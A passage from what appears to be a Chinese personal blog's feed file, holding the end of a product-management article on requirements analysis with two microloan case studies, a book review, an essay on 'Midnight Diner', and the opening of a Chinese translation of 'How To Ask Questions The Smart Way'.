src="https://cos.gjcloak.xyz/pigo/202303161616837.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>严格来说，怎么来做已经不属于需求分析范畴，但是当面临的需求比较大但是研发资源不足时候就需要考虑怎么来做了，比如说优惠券系统，涉及到模板创建、运营发券、用户领券、用券、核销、数据统计等，在研发资源不足业务有比较急需情况下，就需要将一整个大需求进行拆解，分多期来做。从这个角度来说也够得着需求分析的边</p><h2 id="2个案例"><a href="#2个案例" class="headerlink" title="2个案例"></a>2个案例</h2><h3 id="案例1：财务结算报表需求"><a href="#案例1：财务结算报表需求" class="headerlink" title="案例1：财务结算报表需求"></a>案例1：财务结算报表需求</h3><p>业务背景：</p><p>公司甲为某小贷公司一级代理中介，其职能是为小额贷款公司寻找二级渠道客户，用户经二级渠道办理业务，钱款直接打到小贷公司（由于业务法规限制，系统无法直接在用户付款时候进行分账），每月月末，小贷公司分账给甲公司，甲再分账给二级代理公司。</p><p>如下图所示：</p><p><img src="https://cos.gjcloak.xyz/pigo/202303161602001.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>当时财务是这么提需求的大概是这么说的——</p><p>“我需要一个2个结算报表页面，两个报表都有balabala字段，都要有个EXCEL导出功能。”</p><p>下面我们套用需求框架对此需求进行分析：</p><p><strong>1. 目标分析：</strong></p><p>此需求受众是谁？——财务（废话……）</p><p>是否影响其他人？——否</p><p>此需求目标是什么？——是要一个列表吗和EXCEL导出吗？</p><p>显然不是，因为前期分账也有EXCEL，只不过是研发从数据库拉取的，她要的是能够更效率的分账与核账，最终目标是“更效率分账和核账”。</p><p>此处必须要废话一下，因为有的新人产品经理会真的直接按照需求方提的要求做出这么两个表格出来。</p><p><strong>2. 价值分析：</strong></p><p>此需求有无价值，价值几何？很显然有，只不过是一个优先级问题，只要没有更高优先级需求这个需求肯定要做的，因为可以节约开发和财务双方的时间。</p><p><strong>3. 业务流程梳理：</strong><br>可参见上图，财务核心点就在于向上游和下游的结算、核账。</p><p><strong>4. 场景分析：</strong></p><p>在这里，因为这个是一个新项目，我不是太了解此条业务线结算场景，所以需要和财务进行了大概如下对话（这一步非常关键，知道怎么用，才能设计好对应功能）：</p><p>我：你能简单说一下你以后要怎么用着两张报表吗？</p><p>财务：每个月月底小贷公司打款过来，然后我用“报表1”进行核对打款是否正确。每个月我根据“报表2”计算应付渠道多少款</p><p>我：那为什么要拆成两个报表？之前研发不是拉一张报表给你就OK了吗？</p><p>财务：因为结算给渠道不能让他们看到成本，结算给小贷公司，也不会给他看渠道成本，他们也不关心（已经获得第1个结算场景全貌）</p><p>我：那我做一个报表给你，你再拆不一样吗？（这么问不是为了偷懒，因为工作量差不了多少，主要目的还是旁敲侧击挖掘其使用场景）</p><p>财务：这样也可以，但是有些麻烦，而且有的时候渠道方中途想核对一下月中数据是否一致，此时不用导出EXCEL报表发过去，比较麻烦，直接截个图对下数据就可以了（获得了第2个使用场景）</p><p>我：除了对账，表格对你还有其他帮助吗？</p><p>财务：还会去统计每个渠道带来利润，看看渠道大体情况</p><p>我：那分成两个表格你怎么统计利润？</p><p>财务：（财务有点支吾，估计之前没考虑到）我可以自己再把表格合起来然后对账（获取了第3个场景全貌）</p><p>从以上的对话可以看出财务所提的方案，满足不了她自己所有的使用场景需求，当然后续对话还有一部分是关于功能细节的，这里不赘述了。</p><p>有的人可能会问，财务说的也对，两个表格到时候她自己合起来对账就OK了？</p><p>那么首先这样麻烦，容易造成错误不说，最关键的一个问题是，她如果要去做合表，必须保证后台所查出来的两个表格数据排序是一样的，否则就会造成数据对不齐！如果直接开发上线，后续就不得不面临着一个问题——需求变更#@￥！￥%@%￥！%￥</p><p><strong>5. 功能设计：</strong></p><p>有了具体的使用场景，对业务了解，基本功能设计就不太会出多少问题了，这个产品形态很简单。下面直接附上最终的交互稿：</p><p><img src="https://cos.gjcloak.xyz/pigo/202303161615102.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>至于后续的几个步骤，在这个例子中不需要做，因为功能很简单工作量小</p><h3 id="案例二：优化认证转化率"><a href="#案例二：优化认证转化率" class="headerlink" title="案例二：优化认证转化率"></a>案例二：优化认证转化率</h3><p>某小额贷款公司，整体业务流程为：用户登录注册→认证获取额度→申请→审批→打款</p><p><strong>需求背景：</strong></p><p>在该项目上线半年左右，业务已经逐步趋于稳定了。于是就琢磨着看能不能提高业务效率，在当时整体的认证转化率在35%左右，凭直觉有很大的优化空间，于是就自己倒腾备库，拉了一周的和认证相关的业务数与埋点数据，做出了下图：</p><p><img src="https://cos.gjcloak.xyz/pigo/202303161616682.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>在这张图上很容易看出进入页面&#x3D;》提交身份认证，联系人1点击&#x3D;》联系人2点击，这2步跳变流失比明显比较大，于是就有了“优化认证转化率”的需求，套用需求分析框架。</p><p><strong>1. 目标分析：</strong></p><p>此需求受众是谁？所有进入我们APP无特定属性用户。是否影响其他部门&#x2F;人？应该不影响。此需求的目标是什么？提高用户进入认证页到获得额度的总体转化率。</p><p><strong>2. 价值分析：</strong></p><p>此需求价值几何？</p><p>简单来算一笔账，市场运营推广费，平均一个注册用户在4~10多块，我们就按照6块来算，我们每天新注册然后到认证页面用户在1W2左右，如果能将认证转化率提高X%，那么每天可以等价为公司节省下：</p><p><strong>12000*[1-35&#x2F;(35+X)]*6&#x3D;72000*X&#x2F;(35+X)元</strong></p><p>（公式得来是因为我们要维持放款量是一定的，转化率高了对应的拉的用户量就可以减少，大家可以自己推算）</p><p>简单代入，如果提高了1%，那么每天可以为公司节省2000元左右推广费，如果提高了5%呢？那么每天就可以节省9000元，一个月就可以省下27W！！！的推广费用。</p><p><strong>3. 业务流程梳理：</strong></p><p>此处应该说是问题分析了。第一步到第二步之所以跳失这么高，大胆猜测原因：</p><ul><li>1）骗贷用户，身份证提交不了（因为身份证需要拍照，我们接了三方防伪，假冒身份证提交不上来）</li><li>2）未成年用户（身份证年龄前端计算低于18岁就不给提交）</li><li>3）页面采集用全部展开方式，信息太多，对用户不太友好</li></ul><p>紧急联系人1→紧急联系人2  仔细去用了，分析一下大胆猜测跳失率如此高的原因：</p><p>填写联系人系统需要读取用户通讯从通讯录中选取，当初在设计时候为了提高用户体验就将授权分散在各个步骤，需要用到时候才授权。</p><p>此处猜测之所以联系人2比联系人1点击跳变这么大，可能是在联系人1点击时候，获取用户通讯录授权让用户产生担忧而造成大量流失。</p><p>参考了其他竞品和世面上软件，所有授权在用户第一次进入APP之后就全部一起弹出。</p><p><strong>4. 场景分析：此处无</strong></p><p><strong>5. 功能设计：</strong></p><p>针对以上的猜测，做以下优化：</p><ul><li>1）增加身份证照片上传报错上报埋点，将报错原因上传至后台</li><li>2）将提交身份证按钮报错也上传（以前前端拦截不上传），并上传报错信息</li><li>3）在用户打开APP即获取所有授权，减少用户获取联系人时候</li></ul><p><strong>6. 优先级协调：</strong></p><p>系统和业务已比较稳定，精细化运营优先级可以提高。</p><p><strong>7. 资源协调：</strong></p><p>依照6，只要价值阐述得当，团队认可，资源肯定到位，而且工作量很小……</p><p><strong>8. 迭代计划（重点阐述一下）：</strong></p><ul><li>1）因为这个需求效果不能确定，不能做全量更新，但是我们当时没有ABtest支持。所以就想了一个折中办法，就是挑选一个量相对来说还可以，认证页面漏斗和整体没有太大差异，（记得选的是华为渠道吧，每天注册量1000多）</li><li>2）进行内部非强制升级提醒，此处提醒一下，一定不要在某一个渠道发包，因为渠道会有抓包机制，因为你在A渠道新版本的包，其他渠道如果版本低的话会将A渠道的包抓去更新，这样不仅会导致包的渠道号错乱，而且万一所做的改动起到的是负效果，损失将会很大。</li><li>3）观察数据，如果有效果则全渠道更新，如果没效果，则将定向渠道代码回滚，再次更新，等待后续新版本将所有渠道全量升级统一版本</li></ul><p>后续又根据数据进行了多次优化验证，这里就不说了，直接说结果吧，优化的确有效果，联系人1点击→联系人2点击跳失率从原来的25%左右下降到16%左右，整体转化率提高了3个百分点样子。每个月可为公司节省17W左右推广成本（实际推广成本节省随着每个月目标不同而不同）。</p><p>第一步到第二步的跳失根据上报数据和猜想大体一致，但是后续还做了交互上优化，也提高了一点，这里就不再阐述了。</p><h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>最好我想说，方法论与框架是用来帮助我们的，不是用来限制我们的。</p><p>在自己对于需求分析不熟悉的时候或者需求比较复杂的时候可以套用框架来帮助我们找到解题思路，当我们对需求分析已经成为本能的时候应该学会放下框架和方法论，在实际工作中会遇到千种千样的需求，需求分析也要灵活多变，甚至有的需求就是改个文案，此时还陷入在框架或者方法论就无疑有点照猫画虎了。</p><p>以上是个人对需求分析的理解与总结，说的不到位地方请大神指点，也欢迎大家一起交流。</p><p>原文：<a href="https://www.woshipm.com/pmd/3176698.html">需求分析是什么&amp;案例解析</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识 </tag>
            
            <tag> 初级 </tag>
            
            <tag> 需求分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>当我们不再理解世界</title>
      <link href="/467.html"/>
      <url>/467.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>当我们不再理解这个意有所指的世界，宇宙仍在运转、人类仍在思考。</p></blockquote><p>“我们攀升，我们坠落。我们通过坠落而攀升。失败塑造了我们。我们唯一的智慧是悲剧的，它总是到来得太晚，也只为迷失者所知。”</p><p>摸鱼两天读完了这本书，这本书为理解世界提供了一种新的角度，在虚幻与现实中致力找到一种所属于科学的独特的平衡。用第三人称视角娓娓道来，整本书笼罩的人文主义关怀又为冷峻晦涩的理科原理阐述增添一层朦胧色彩。一口气读完有种怅然若失的感觉。《普鲁士蓝》的弗尔茨并不因他提取出的氮气成为纳粹的帮凶导致无数人死亡而内疚，却为改造地球自然平衡而担忧；《史瓦西奇点》的卡尔身处战争屠场却无限逼近至测算出的那个正在无限收缩的孔洞；《心之心》的几位科学家为探索世界本原而疯狂，却对自己存在意义产生无尽怀疑的悖论。科学的伟大与催生的罪恶同行，书结尾处因过度繁盛而死亡的柠檬树，何尝不是对其的一种隐喻呢？</p>]]></content>
      
      
      <categories>
          
          <category> 书籍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分享 </tag>
            
            <tag> 书籍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深夜食堂 (2009)</title>
      <link href="/3df17a12.html"/>
      <url>/3df17a12.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>每只胃里都有一颗心。</p></blockquote><p>深夜档的节日就应该在深夜看。</p><p>等到街上的行人渐渐的稀少，路灯淡淡的散发暖黄色的光，头顶是墨蓝色的天空点缀着几只冷清的星，这样的时候走到石板路口的小饭馆里，掀开门帘拉开门，坐在桌子前说出自己喜欢的食物，然后在熟悉又怀念的滋味里感受这样或那样的心情。<br>Master是寡淡的人。左眼有一条刀疤。不怎么说话，客人稀少的时候坐在厨房门口慢慢的吸一支烟，也会翻看报纸或者开着小电视悠悠闲闲的瞄几眼。也是喜欢喝beer的人。总是在客人点完餐以后说句好的，就钻进厨房默默地料理食物。<br>每种食物都很简单，但是包含着浓浓故事味道。<br>日本料理对于食物本身的味道相当执迷，每种食材都有自身独一无二的鲜美，无论是柔软的白米饭还是炸成八爪鱼的红肠，无论是甜鸡蛋卷还是牛油拌饭。</p><ol><li>茶泡饭三姐妹<br>茶泡饭其实不难做，米饭蒸好以后浇上煮好的绿茶，简单搭配梅子或者鱼肉，撒上海苔就基本完成。<br>难做的女生之间的友情。<br>女生的心思从来都纤细。喜欢一起立下各种约定，但是约定被打破的时候又会觉得被背叛。<br>就和梅干、鲑鱼和鳕子三姐妹一样。<br>不再是少女却依然相信纯爱，她们彼此约定了不会因为别人的眼光就对自己屈服，一定要找到自己喜欢的人再结婚。在一场婚礼后，鳕子回家照顾自己生病的母亲，然后去相了一次亲，而对象则是三人曾经吐槽过的“秃头”“肥胖”的中年男子类型。同时留在东京的梅干，鲑鱼两姐妹也因为鲑鱼交往的对象是梅干的EX而争执之后大打出手。</li></ol><p>女人之间无友情。<br>不知道这句话从何而来。也许是身为女性有很多的不得已。在这个“闺蜜”已经被黑出翔的年代，闺蜜已经变成背后插刀婚内小三的代言。<br>总觉得女生之间的友谊都是建立在好恶相同的基础上的。有共同的敌人或者追求，形成联盟也会快速容易的多。当喜欢的对象和讨厌的对象都相同的时候，无论是吐槽还是花痴都变成很快乐的事。<br>但是当这条约好一起走下去的路却有人中途离开的时候，另一方必定会相当困惑。<br>我们不是说好的么，为什么你就变卦了呢。<br>我们不是都是这样的人么，为什么你就忽然变了呢。<br>我们不是都喜欢这些的么，为什么你就讨厌了呢。<br>朋友离开的痛苦有时候比失恋还要深。<br>如果能把女生的友谊具象化，产生的物件一定是脆弱但融合性极佳的物品。小打小闹时时有，但是和好起来也就是一杯奶茶或者一场电影的工夫。或者前一秒在吵架后一秒说一起去吃东西就还是开开心心的去了。<br>时间久了渐渐的变得坚固。<br>对方变成了，即使是凌晨吵架摔门出走后唯一一个不用顾忌的温暖的去处，变成了婚礼上忙前忙后连喜宴都来不及细细品尝的伴娘，变成了怀孕时候泡一杯热牛奶陪你聊天解闷的心理师，变成了下班以后一起去菜场挑选新鲜蔬菜讨论怎么煮饭才能又美味又有营养的大厨，变成了晚饭后一起去跳广场舞的舞伴。<br>即使有裂痕，也一直温暖的存在着。</p><ol start="2"><li>鸡蛋三明治<br>女孩子刚来店里的时候穿着简单的牛仔衬衣，歪着头想了很久却还是点了猪骨汤套餐。吃到一半的时候男孩子进来递给老板面包片，叫了鸡蛋三明治。男孩子把鸡蛋三明治分给她吃。从此以后她都带面包片来老板店里吃鸡蛋三明治，边吃边等男孩子。男孩子是很努力的人，每天都要很早起来去报社送报纸，只有休息的时候会带面包片来老板店里。<br>他们被店里的人叫做黎明食堂的爱恋。<br>女孩子作为艺人渐渐的开始有名气。在向男孩子表白的时候被男孩子以“我们是不同世界的人”为理由拒绝了。<br>和那个坐在角落里数着花生喝酒的人说的一样，世上 下流 中流 若如有栖川 人生无常。<br>后来男孩子在梅干小姐的鼓励下终于鼓足勇气去向女孩子表白。他发短讯给女孩子：我有话要对你说。<br>但却在她公司的门口听到她已经订婚的消息。<br>男孩子于是放弃了，留女孩子一个人在风里徘徊。<br>于是女孩子又来了老板的店里。两个人分着吃了男孩子的鸡蛋三明治，然后女孩子离开了。<br>从此以后男孩子再也没有点过鸡蛋三明治。</li></ol><p>生活中只有爱情是远远不够的。现实永远逼迫你的感情要向着理智的方向发展，再也不能有情饮水饱。与其让日后的争吵狼狈毁掉之前所有美好的回忆，不如留条生路，让彼此都好过。<br>真正的持久的感情要落到实处才得以持久。在这样快速的年代，再浓厚的情感都会被现实一刀刀剥离的面目全非。<br>所以所谓合适的人不一定是感觉多么强烈的人。也许没有电视剧电影里轰轰烈烈要死要活的的爱过。但是彼此懂得，知道对方索取什么，也知道自己给得了什么。就这样安安静静的结伴走下去也一样是一种选择。</p><p>如果非要相濡以沫，不如相忘于江湖，你说呢。</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分享 </tag>
            
            <tag> 深夜食堂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《提问的智慧》中文版</title>
      <link href="/4e870bb2.html"/>
      <url>/4e870bb2.html</url>
      
        <content type="html"><![CDATA[<h1 id="提问的智慧"><a href="#提问的智慧" class="headerlink" title="提问的智慧"></a>提问的智慧</h1><h4 id="艾瑞克-史蒂文-雷蒙德（Eric-Steven-Raymond）"><a href="#艾瑞克-史蒂文-雷蒙德（Eric-Steven-Raymond）" class="headerlink" title="艾瑞克.史蒂文.雷蒙德（Eric Steven Raymond）"></a>艾瑞克.史蒂文.雷蒙德（Eric Steven Raymond）</h4><p>Thyrsus Enterprises</p><p><a href="mailto:esr@thyrsus.com">mailto:esr@thyrsus.com</a></p><h4 id="瑞克-莫恩（Rick-Moen）"><a href="#瑞克-莫恩（Rick-Moen）" class="headerlink" title="瑞克.莫恩（Rick Moen）"></a>瑞克.莫恩（Rick Moen）</h4><p><a href="mailto:respond-auto@linuxmafia.com">mailto:respond-auto@linuxmafia.com</a><br>版权©2001, 2006 Eric S. Raymond, Rick Moen</p><h3 id="修订历史"><a href="#修订历史" class="headerlink" title="修订历史"></a>修订历史</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">修订版 3.9    2013年4月23日    esr</span><br><span class="line">修正链接</span><br><span class="line">修订版 3.8    2012年6月19日    esr</span><br><span class="line">修正链接</span><br><span class="line">修订版 3.7    2010年12月6日    esr</span><br><span class="line">对于英语为第二语言人士的有益建议</span><br><span class="line">修订版 3.7    2010年11月2日    esr</span><br><span class="line">几种翻译不见了</span><br><span class="line">修订版 3.6    2008年3月19日    esr</span><br><span class="line">小更新及新链接</span><br><span class="line">修订版 3.5    2008年1月2日    esr</span><br><span class="line">勘误及一些翻译链接</span><br><span class="line">修订版 3.4    2007年3月24日    esr</span><br><span class="line">新章节：“关于代码的问题”</span><br><span class="line">修订版 3.3    2006年9月29日    esr</span><br><span class="line">增加凯.尼格曼（Kai Niggemann）的一个好建议</span><br><span class="line">修订版 3.2    2006年1月10日    esr</span><br><span class="line">加入瑞克.莫恩（Rick Moen）编写的内容</span><br><span class="line">修订版 3.1    2004年10月28日    esr</span><br><span class="line">文档“谷歌是你的朋友！”</span><br><span class="line">修订版 3.0    2004年2月2日    esr</span><br><span class="line">主要新增在网页论坛应有的礼节</span><br></pre></td></tr></table></figure><h3 id="原文：How-To-Ask-Questions-The-Smart-Way"><a href="#原文：How-To-Ask-Questions-The-Smart-Way" class="headerlink" title="原文：How To Ask Questions The Smart Way"></a><a href="http://www.catb.org/~esr/faqs/smart-questions.html">原文：How To Ask Questions The Smart Way</a></h3><p>翻译：王刚<br>时间：2013年10月26日<br>内容</p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul><li><p><a href="#%E5%BC%83%E6%9D%83%E7%94%B3%E6%98%8E">弃权申明</a></p></li><li><p><a href="#%E5%BC%95%E8%A8%80">引言</a></p></li><li><p><a href="#%E6%8F%90%E9%97%AE%E5%89%8D">提问前</a></p></li><li><p><a href="#%E6%8F%90%E9%97%AE%E6%97%B6">提问时</a></p><ul><li><a href="#%E4%BB%94%E7%BB%86%E6%8C%91%E9%80%89%E8%AE%BA%E5%9D%9B">仔细挑选论坛</a></li><li><a href="#%E9%9D%A2%E5%90%91%E6%96%B0%E6%89%8B%E7%9A%84%E8%AE%BA%E5%9D%9B%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%AD%E7%BB%A7%E8%81%8A%E5%A4%A9irc%E9%80%9A%E5%B8%B8%E5%93%8D%E5%BA%94%E6%9C%80%E5%BF%AB">面向新手的论坛和互联网中继聊天（IRC）通常响应最快</a></li><li><a href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%E4%BD%BF%E7%94%A8%E9%A1%B9%E7%9B%AE%E7%9A%84%E9%82%AE%E4%BB%B6%E5%88%97%E8%A1%A8">第二步，使用项目的邮件列表</a></li><li><a href="#%E4%BD%BF%E7%94%A8%E6%9C%89%E6%84%8F%E4%B9%89%E4%B8%94%E6%98%8E%E7%A1%AE%E7%9A%84%E4%B8%BB%E9%A2%98">使用有意义且明确的主题</a></li><li><a href="#%E4%BD%BF%E9%97%AE%E9%A2%98%E5%AE%B9%E6%98%93%E5%9B%9E%E5%A4%8D">使问题容易回复</a></li><li><a href="#%E7%94%A8%E6%B8%85%E6%99%B0%E8%AF%AD%E6%B3%95%E6%8B%BC%E5%86%99%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%AF%AD%E5%8F%A5%E4%B9%A6%E5%86%99">用清晰、语法、拼写正确的语句书写</a></li><li><a href="#%E4%BD%BF%E7%94%A8%E6%98%93%E4%BA%8E%E8%AF%BB%E5%8F%96%E4%B8%94%E6%A0%87%E5%87%86%E7%9A%84%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%8F%91%E9%80%81%E9%97%AE%E9%A2%98">使用易于读取且标准的文件格式发送问题</a></li><li><a href="#%E6%8F%8F%E8%BF%B0%E9%97%AE%E9%A2%98%E5%BA%94%E5%87%86%E7%A1%AE%E4%B8%94%E6%9C%89%E5%86%85%E5%AE%B9">描述问题应准确且有内容</a></li><li><a href="#%E9%87%8F%E4%B8%8D%E5%9C%A8%E5%A4%9A%E7%B2%BE%E7%82%BC%E5%88%99%E7%81%B5">量不在多，精炼则灵</a></li><li><a href="#%E5%88%AB%E6%80%A5%E4%BA%8E%E5%AE%A3%E7%A7%B0%E6%89%BE%E5%88%B0Bug">别急于宣称找到Bug</a></li><li><a href="#%E4%BD%8E%E5%A3%B0%E4%B8%8B%E6%B0%94%E4%BB%A3%E6%9B%BF%E4%B8%8D%E4%BA%86%E5%81%9A%E8%87%AA%E5%B7%B1%E7%9A%84%E5%AE%B6%E5%BA%AD%E4%BD%9C%E4%B8%9A">低声下气代替不了做自己的家庭作业</a></li><li><a href="#%E6%8F%8F%E8%BF%B0%E9%97%AE%E9%A2%98%E7%97%87%E7%8A%B6%E8%80%8C%E4%B8%8D%E6%98%AF%E7%8C%9C%E6%B5%8B">描述问题症状而不是猜测</a></li><li><a href="#%E6%8C%89%E6%97%B6%E9%97%B4%E5%85%88%E5%90%8E%E7%BD%97%E5%88%97%E9%97%AE%E9%A2%98%E7%97%87%E7%8A%B6">按时间先后罗列问题症状</a></li><li><a href="#%E6%8F%8F%E8%BF%B0%E7%9B%AE%E6%A0%87%E8%80%8C%E4%B8%8D%E6%98%AF%E8%BF%87%E7%A8%8B">描述目标而不是过程</a></li><li><a href="#%E5%88%AB%E8%A6%81%E6%B1%82%E7%A7%81%E4%B8%8B%E5%9B%9E%E5%A4%8D%E7%94%B5%E9%82%AE">别要求私下回复电邮</a></li><li><a href="#%E6%8F%90%E9%97%AE%E5%BA%94%E6%98%8E%E7%A1%AE">提问应明确</a></li><li><a href="#%E5%85%B3%E4%BA%8E%E4%BB%A3%E7%A0%81%E7%9A%84%E9%97%AE%E9%A2%98">关于代码的问题</a></li><li><a href="#%E5%88%AB%E5%BC%A0%E8%B4%B4%E5%AE%B6%E5%BA%AD%E4%BD%9C%E4%B8%9A%E5%BC%8F%E9%97%AE%E9%A2%98">别张贴家庭作业式问题</a></li><li><a href="#%E5%88%A0%E9%99%A4%E6%97%A0%E6%84%8F%E4%B9%89%E7%9A%84%E8%A6%81%E6%B1%82">删除无意义的要求</a></li><li><a href="#%E4%B8%8D%E8%A6%81%E6%8A%8A%E9%97%AE%E9%A2%98%E6%A0%87%E8%AE%B0%E4%B8%BA%E7%B4%A7%E6%80%A5%E5%8D%B3%E4%BD%BF%E5%AF%B9%E4%BD%A0%E8%80%8C%E8%A8%80%E7%9A%84%E7%A1%AE%E5%A6%82%E6%AD%A4">不要把问题标记为“紧急”，即使对你而言的确如此</a></li><li><a href="#%E7%A4%BC%E8%B2%8C%E6%80%BB%E6%98%AF%E6%9C%89%E7%9B%8A%E7%9A%84">礼貌总是有益的</a></li><li><a href="#%E7%A4%BC%E8%B2%8C%E6%80%BB%E6%98%AF%E6%9C%89%E7%9B%8A%E7%9A%84">问题解决后追加一条简要说明</a></li></ul></li><li><p><a href="#%E5%A6%82%E4%BD%95%E8%A7%A3%E8%AF%BB%E5%9B%9E%E7%AD%94">如何解读回答</a></p><ul><li><a href="#%E8%AF%BB%E8%AF%BB%E8%AF%A5%E6%AD%BB%E7%9A%84%E6%89%8B%E5%86%8Crtfm%E5%92%8C%E6%90%9C%E6%90%9C%E8%AF%A5%E6%AD%BB%E7%9A%84%E7%BD%91%E7%BB%9Cstfw%E5%A6%82%E4%BD%95%E6%98%8E%E7%99%BD%E4%BD%A0%E5%B7%B2%E5%AE%8C%E5%85%A8%E6%90%9E%E7%A0%B8">“读读该死的手册”（RTFM）和“搜搜该死的网络”（STFW）：如何明白你已完全搞砸</a></li><li><a href="#%E5%A6%82%E6%9E%9C%E8%BF%98%E4%B8%8D%E6%98%8E%E7%99%BD">如果还不明白……</a></li><li><a href="#%E5%AF%B9%E5%BE%85%E6%97%A0%E7%A4%BC">对待无礼</a></li></ul></li><li><p><a href="#%E5%88%AB%E8%B1%A1%E5%A4%B1%E8%B4%A5%E8%80%85%E9%82%A3%E6%A0%B7%E5%8F%8D%E5%BA%94">别象失败者那样反应</a></p></li><li><p><a href="#%E5%88%AB%E8%B1%A1%E5%A4%B1%E8%B4%A5%E8%80%85%E9%82%A3%E6%A0%B7%E5%8F%8D%E5%BA%94">提问禁忌</a></p></li><li><p><a href="#%E5%A5%BD%E9%97%AE%E9%A2%98%E4%B8%8E%E5%9D%8F%E9%97%AE%E9%A2%98">好问题与坏问题</a></p></li><li><p><a href="#%E5%A6%82%E6%9E%9C%E5%BE%97%E4%B8%8D%E5%88%B0%E5%9B%9E%E7%AD%94">如果得不到回答</a></p></li><li><p><a href="#%E5%A6%82%E4%BD%95%E6%9B%B4%E5%A5%BD%E5%9C%B0%E5%9B%9E%E7%AD%94">如何更好地回答</a></p></li><li><p><a href="#%E7%9B%B8%E5%85%B3%E8%B5%84%E6%BA%90">相关资源</a></p></li><li><p><a href="#%E9%B8%A3%E8%B0%A2">鸣谢</a></p></li></ul><blockquote><p>译文： 印尼语 白俄罗斯语 巴西葡萄牙语 简体中文 荷兰语 法语 乔治亚语 德语 希腊语 希伯来语 日语 波兰语 葡萄牙语 罗马尼亚语 俄语 西班牙语 泰语 如果你想复制、镜像、翻译或引用本文，请参阅我的 复制协议。</p></blockquote><h3 id="弃权申明"><a href="#弃权申明" class="headerlink" title="弃权申明"></a>弃权申明</h3><p>许多项目的网站在如何取得帮助的部分链接了本文，这没有关系，也正是我们想要的。但如果你是该项目生成此链接的网管，请在链接附近显著位置注明：我们不提供该项目的服务支持！</p><p>我们已经领教了没有此说明带来的痛苦，我们将不停地被一些白痴纠缠，他们认为既然我们发布了本文，那么我们就有责任解决世上所有的技术问题。</p><p>如果你是因为需要帮助正在阅读本文，然后就带着可以直接从作者那取得帮助的印象离开，那么 你 就不幸成了我们所说的白痴之一。 别向 我们 提问，我们不会理睬的。 我们只是在这教你如何从那些真正懂得你软硬件问题的人那里取得帮助，但 99.9％ 的时间我们不会是那些人。除非你非常地 确定 本文的作者是你遇到问题方面的专家，请不要打搅，这样大家都更开心一点。</p><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>在 黑客 的世界里，你所提技术问题的解答很大程度上取决于你提问的方式与解决此问题的难度，本文将教你如何提问才更有可能得到满意的答复。</p><p>开源程序的应用已经很广，你通常可以从其他更有经验的用户而不是黑客那里得到解答。这是好事，他们一般对新手常有的毛病更容忍一点。然尔，使用我们推荐的方法，象对待黑客那样对待这些有经验的用户，通常能最有效地得到问题的解答。</p><p>第一件需要明白的事是黑客喜欢难题和激发思考的好问题。假如不是这样，我们也不会写本文了。如果你能提出一个有趣的问题让我们咀嚼玩味，我们会感激你。好问题是种激励与礼物，帮助我们发展认知，揭示没有注意或想到的问题。在黑客中，“好问题！” 是非常热烈而真挚的赞许。</p><p>此外，黑客还有遇到简单问题就表现出敌视或傲慢的名声。有时，我们看起来还对新手和愚蠢的家伙有条件反射式的无礼，但事情并不真是这样。</p><p>我们只是毫无歉意地敌视那些提问前不愿思考、不做自己家庭作业的人。这种人就象时间无底洞──他们只知道索取，不愿意付出，他们浪费了时间，这些时间本可用于其它更有趣的问题或更值得回答的人。我们将这种人叫做 “失败者（loser）” （由于历史原因，我们有时将“loser”拼写为“lusers” 。）</p><p>我们意识到许多人只是想使用我们写的软件，他们对学习技术细节没有兴趣。对大多数人而言，计算机只是种工具，是种达到目的的手段而已。他们有自己的生活并且有更要紧的事要做，我们承认这点，也从不指望每个人都对这些让我们着迷的技术问题感兴趣。不过，我们回答问题的风格是为了适应那些真正对此有兴趣并愿意主动参与解决问题的人，这一点不会变，也不该变。如果连这都变了，我们就会在自己能做得最好的事情上不再那么犀利。</p><p>我们（大多数）是自愿者， 从自己繁忙的生活中抽时间来回答问题，有时会力不从心。因此，我们会毫不留情地滤除问题，特别是那些看起来象是失败者提的，以便更有效地把回答问题的时间留给那些胜利者。</p><p>如果你认为这种态度令人反感、以施惠者自居或傲慢自大，请检查你的假设，我们并未要求你屈服──事实上，假如你做了该做的努力，我们中的大多数将非常乐意平等地与你交流，并欢迎你接纳我们的文化。试图去帮助那些不愿自救的人对我们简直没有效率。不懂没有关系，但愚蠢地做事不行。</p><p>所以，你不必在技术上很在行才能吸引我们的注意，但你 必须 表现出能引导你在行的姿态──机 敏、有想法、善于观察、乐于主动参与问题的解决。如果你做不到这些使你与众不同的事情，我们建议你付钱跟别人签商业服务合同，而不是要求黑客无偿帮助。</p><p>如果你决定向我们求助，你不会想成为一名失败者，你也不想被看成一个失败者。得到快速有效回答的最好方法是使提问者看起来象个聪明、自信和有想法的人，并且暗示只是碰巧在某一特别问题上需要帮助。</p><p>（欢迎对本文指正，可以将建议发至 <a href="mailto:esr@thyrsus.com">esr@thyrsus.com</a> 或 <a href="mailto:respond-auto@linuxmafia.com">respond-auto@linuxmafia.com</a>。 请注意，本文不想成为一般性的 